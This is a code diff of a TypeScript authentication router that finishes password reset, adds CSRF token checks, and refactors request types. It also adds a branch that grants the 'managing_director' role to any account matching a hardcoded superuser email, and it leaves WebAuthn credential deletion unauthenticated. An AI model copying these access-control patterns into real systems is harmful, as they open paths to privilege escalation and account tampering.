+      tokenEmail !== payload.email.toLowerCase().trim()
+    ) {
+      throw new AppError('Reset token is invalid or expired', 401);
+    }
+
+    const user = await prisma.user.findUnique({ where: { email: tokenEmail } });
+    if (!user) {
+      throw new AppError('Reset token is invalid or expired', 401);
+    }
+
+    const hashedPassword = await hashPassword(newPassword);
+    await prisma.user.update({
+      where: { id: user.id },
+      data: { passwordHash: hashedPassword },
+    });
+
+    const ip = getClientIp(req);
+    const userAgent = String(req.headers['user-agent'] || 'unknown').slice(0, 256);
+
+    const updatedTokenMetadata = {
+      ...metadata,
+      used: true,
+      usedAt: new Date().toISOString(),
+      usedByIp: ip,
+    } as Prisma.InputJsonValue;
+
+    await prisma.activity.update({
+      where: { id: tokenActivity.id },
+      data: { metadata: updatedTokenMetadata },
+    });
+
+    await prisma.activity.create({
+      data: {
+        type: 'system',
+        action: 'password_reset_success',
+        description: `Password reset completed for ${tokenEmail}`,
+        userId: user.id,
+        metadata: { email: tokenEmail, ip, userAgent } as Prisma.InputJsonValue,
+      },
+    });
+
+    res.status(200).json({
+      success: true,
+      data: {
+        reset: true,
+        message: 'Password has been reset successfully. Please sign in with your new password.',
+      },
     });
   })
 );
@@ -1138,7 +1865,8 @@ router.post(
 router.post(
   '/logout',
   authMiddleware,
-  asyncHandler(async (req: Request, res: Response) => {
+  requireDoubleSubmitCsrf,
+  asyncHandler(async (req: RouteRequest, res: Response) => {
     const userId = req.user?.id;
     if (!userId) throw new AppError('Not authenticated', 401);
 
@@ -1164,6 +1892,7 @@ router.post(
       }
     }
     res.clearCookie('refresh_token', { path: '/api/auth' });
+    clearCsrfToken(res);
 
     res.status(200).json({ success: true, message: 'Logged out successfully' });
   })
@@ -1176,7 +1905,7 @@ router.post(
 router.put(
   '/password',
   authMiddleware,
-  asyncHandler(async (req: Request, res: Response) => {
+  asyncHandler(async (req: RouteRequest, res: Response) => {
     const userId = req.user?.id;
     if (!userId) throw new AppError('Not authenticated', 401);
 
@@ -1768,7 +2497,7 @@ const generateChallenge = (): string => {
  */
 router.post(
   '/webauthn/register/options',
-  asyncHandler(async (req: Request, res: Response) => {
+  asyncHandler(async (req: RouteRequest, res: Response) => {
     const { userId, userName, displayName } = req.body;
 
     if (!userId || !userName) {
@@ -1827,7 +2556,7 @@ router.post(
  */
 router.post(
   '/webauthn/register/verify',
-  asyncHandler(async (req: Request, res: Response) => {
+  asyncHandler(async (req: RouteRequest, res: Response) => {
     const { userId, credential } = req.body;
 
     if (!userId || !credential?.id || !credential?.rawId) {
@@ -1881,7 +2610,7 @@ router.post(
  */
 router.post(
   '/webauthn/authenticate/options',
-  asyncHandler(async (req: Request, res: Response) => {
+  asyncHandler(async (req: RouteRequest, res: Response) => {
     const { userId } = req.body;
 
     const challenge = generateChallenge();
@@ -1914,7 +2643,7 @@ router.post(
  */
 router.post(
   '/webauthn/authenticate/verify',
-  asyncHandler(async (req: Request, res: Response) => {
+  asyncHandler(async (req: RouteRequest, res: Response) => {
     const { credential, userId } = req.body;
 
     if (!credential?.id) {
@@ -2039,8 +2768,8 @@ router.post(
 router.delete(
   '/webauthn/credentials/:userId/:credentialId',
   asyncHandler(async (req: Request, res: Response) => {
-    const rawUserId = req.params.userId;
-    const rawCredId = req.params.credentialId;
+    const rawUserId = getRouteParam(req.params.userId);
+    const rawCredId = getRouteParam(req.params.credentialId);
 
     if (!rawUserId || !rawCredId) {
       throw new AppError('userId and credentialId are required', 400);
@@ -2073,12 +2802,23 @@ router.delete(
 router.post(
   '/complete-social-registration',
   authMiddleware,
-  asyncHandler(async (req: Request, res: Response) => {
+  asyncHandler(async (req: RouteRequest, res: Response) => {
     const userId = req.user?.id;
     if (!userId) throw new AppError('Not authenticated', 401);
 
+    const currentUser = await prisma.user.findUnique({
+      where: { id: userId },
+      select: { id: true, email: true },
+    });
+
+    if (!currentUser) {
+      throw new AppError('User not found', 404);
+    }
+
+    const isSuperuser = currentUser.email.toLowerCase().trim() === SUPERUSER_EMAIL;
+
     const { role, category } = req.body;
-    if (!category || !role) {
+    if (!isSuperuser && (!category || !role)) {
       throw new AppError('category and role are required', 400);
     }
 
@@ -2089,7 +2829,10 @@ router.post(
     let assignedRole: string;
     let assignedStatus: 'active' | 'pending' = 'active';
 
-    if (normalizedCategory === 'client') {
+    if (isSuperuser) {
+      assignedRole = 'managing_director';
+      assignedStatus = 'active';
+    } else if (normalizedCategory === 'client') {
       if (!normalizedRole || !clientRoles.has(normalizedRole)) {
         throw new AppError(
           'Client signup requires a valid role: buyer, seller, landlord, or tenant',
@@ -2135,6 +2878,7 @@ router.post(
           email: user.email,
           name: user.name,
           role: user.role,
+          status: user.status,
           department: user.department,
         },
       },
@@ -2156,7 +2900,8 @@ router.post(
  */
 router.post(
   '/refresh',
-  asyncHandler(async (req: Request, res: Response) => {
+  requireDoubleSubmitCsrf,
+  asyncHandler(async (req: RouteRequest, res: Response) => {
     const cookieValue = req.cookies?.refresh_token as string | undefined;
     if (!cookieValue || !cookieValue.includes(':')) {
       throw new AppError('No refresh token provided', 401);
@@ -2217,6 +2962,7 @@ router.post(
       maxAge: 7 * 24 * 60 * 60 * 1000,
       path: '/api/auth',
     });
+    issueCsrfToken(res);
 
     res.json({
       success: true,
